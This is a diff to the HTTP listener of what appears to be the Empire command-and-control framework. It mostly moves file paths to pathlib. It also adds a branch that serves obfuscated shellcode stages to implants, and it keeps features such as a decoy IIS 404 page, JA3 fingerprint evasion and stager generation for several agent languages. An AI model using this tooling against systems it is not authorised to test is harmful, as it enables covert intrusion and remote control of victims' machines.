@@ -167,7 +167,7 @@ class Listener:
         )
 
         self.session_cookie = self.options["Cookie"]["Value"]
-        self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
+        self.template_dir = self.mainMenu.install_path / "data/listeners/templates"
         self.instance_log = log
 
         self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
@@ -189,8 +189,7 @@ class Listener:
         """
         Returns an IIS 7.5 404 not found page.
         """
-        with open(f"{self.template_dir}/default.html") as f:
-            return f.read()
+        return (self.template_dir / "default.html").read_text(encoding="utf-8")
 
     def validate_options(self) -> tuple[bool, str | None]:
         """
@@ -475,10 +474,9 @@ class Listener:
             )
             public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
 
-            with open(self.mainMenu.installPath + "/stagers/Sharpire.yaml", "rb") as f:
-                stager_yaml = f.read()
-
-            stager_yaml = stager_yaml.decode("UTF-8")
+            stager_yaml = (
+                self.mainMenu.install_path / "stagers/Sharpire.yaml"
+            ).read_text(encoding="utf-8")
             stager_yaml = (
                 stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                 .replace("{{ REPLACE_STAGINGKEY }}", staging_key)
@@ -538,8 +536,7 @@ class Listener:
 
         if language.lower() == "powershell":
             template_path = [
-                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                self.mainMenu.install_path / "data/agent/stagers",
             ]
 
             eng = templating.TemplateEngine(template_path)
@@ -606,8 +603,7 @@ class Listener:
 
         if language.lower() == "python":
             template_path = [
-                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                self.mainMenu.install_path / "data/agent/stagers",
             ]
 
             eng = templating.TemplateEngine(template_path)
@@ -664,8 +660,9 @@ class Listener:
         b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))
 
         if language == "powershell":
-            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
-                code = f.read()
+            code = (self.mainMenu.install_path / "data/agent/agent.ps1").read_text(
+                encoding="utf-8"
+            )
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -691,12 +688,12 @@ class Listener:
             return code
 
         if language == "python":
-            if version == "ironpython":
-                f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
-            else:
-                f = self.mainMenu.installPath + "/data/agent/agent.py"
-            with open(f) as f:
-                code = f.read()
+            agent_path = (
+                self.mainMenu.install_path / "data/agent/ironpython_agent.py"
+                if version == "ironpython"
+                else self.mainMenu.install_path / "data/agent/agent.py"
+            )
+            code = agent_path.read_text(encoding="utf-8")
 
             # strip out comments and blank lines
             code = helpers.strip_python_comments(code)
@@ -738,8 +735,7 @@ class Listener:
 
         if language.lower() == "powershell":
             template_path = [
-                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                self.mainMenu.install_path / "data/agent/stagers",
             ]
 
             eng = templating.TemplateEngine(template_path)
@@ -762,8 +758,7 @@ class Listener:
 
         if language.lower() == "python":
             template_path = [
-                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+                self.mainMenu.install_path / "data/agent/stagers",
             ]
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http/comms.py")
@@ -880,10 +875,9 @@ class Listener:
                 directory = self.mainMenu.stagergenv2.generate_python_exe(
                     launcher, dot_net_version="net40", obfuscate=obfuscation
                 )
-                with open(directory, "rb") as f:
-                    return f.read()
+                return Path(directory).read_bytes()
 
-            elif stager == "csharp":
+            if stager == "csharp":
                 path = self.mainMenu.stagergenv2.generate_launcher(
                     listener_name=hop or listenerName,
                     language="csharp",
@@ -894,14 +888,13 @@ class Listener:
                     proxy_creds=proxyCreds,
                 )
                 return Path(path).read_bytes()
-            elif stager == "go":
+            if stager == "go":
                 directory = self.mainMenu.stagergenv2.generate_go_stageless(
                     self.options, listenerName
                 )
-                with open(directory, "rb") as f:
-                    return f.read()
-            else:
-                return make_response(self.default_response(), 404)
+                return Path(directory).read_bytes()
+
+            return make_response(self.default_response(), 404)
 
         @app.before_request
         def check_ip():
@@ -968,7 +961,7 @@ class Listener:
                 #
                 # Thanks to making it case-insensitive it works the same way as in
                 # an actual IIS server
-                static_dir = self.mainMenu.installPath + "/data/misc/"
+                static_dir = self.mainMenu.install_path / "data/misc"
                 return send_from_directory(static_dir, "welcome.png")
 
             stager = request.args.get("stager")
@@ -1029,7 +1022,7 @@ class Listener:
             if not dataResults or len(dataResults) <= 0:
                 return make_response(self.default_response(), 200)
 
-            for language, results in dataResults:
+            for language, results, additional in dataResults:
                 if not results:
                     message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
                     self.instance_log.debug(message)
@@ -1051,13 +1044,29 @@ class Listener:
                         hopListenerName
                     )
 
-                    if language.lower() in ["csharp", "ironpython", "go"]:
-                        return generate_stager_response(language, hopListenerName)
-
                     with SessionLocal() as db:
                         obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
                             db, language
                         )
+
+                        if additional.lower() == "shellcode":
+                            stage, err = self.mainMenu.stagergenv2.generate_shellcode(
+                                language=language.lower(),
+                                listener_name=hopListenerName or listenerName,
+                                obfuscate=obf_config.enabled if obf_config else False,
+                                obfuscation_command=obf_config.command
+                                if obf_config
+                                else "",
+                                arch="both",
+                                dot_net_version="net40",
+                            )
+                            if err:
+                                log.error(f"Error generating shellcode: {err}")
+                                return make_response(self.default_response(), 404)
+                            return make_response(stage, 200)
+
+                        if language.lower() in ["csharp", "ironpython", "go"]:
+                            return generate_stager_response(language, hopListenerName)
 
                         if hopListener:
                             stage = hopListener.generate_stager(
@@ -1133,7 +1142,7 @@ class Listener:
             if not dataResults or len(dataResults) <= 0:
                 return make_response(self.default_response(), 404)
 
-            for language, results in dataResults:
+            for language, results, _ in dataResults:
                 if isinstance(results, str):
                     results = results.encode("UTF-8")
 
@@ -1233,7 +1242,7 @@ class Listener:
             ja3_evasion = listenerOptions["JA3_Evasion"]["Value"]
 
             if certPath.strip() != "":
-                certPath = os.path.abspath(certPath)
+                cert_path = Path(certPath).resolve()
 
                 # support any version of tls
                 pyversion = sys.version_info
@@ -1246,8 +1255,8 @@ class Listener:
 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain(
-                    f"{certPath}/empire-chain.pem",
-                    f"{certPath}/empire-priv.key",
+                    cert_path / "empire-chain.pem",
+                    cert_path / "empire-priv.key",
                 )
 
                 if ja3_evasion:
@@ -1273,7 +1282,7 @@ class Listener:
         self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
         self.thread.daemon = True
         self.thread.start()
-        time.sleep(1)
+        time.sleep(0.1 if os.environ.get("TEST_MODE") else 1)
         # returns True if the listener successfully started, false otherwise
         return self.thread.is_alive()
 
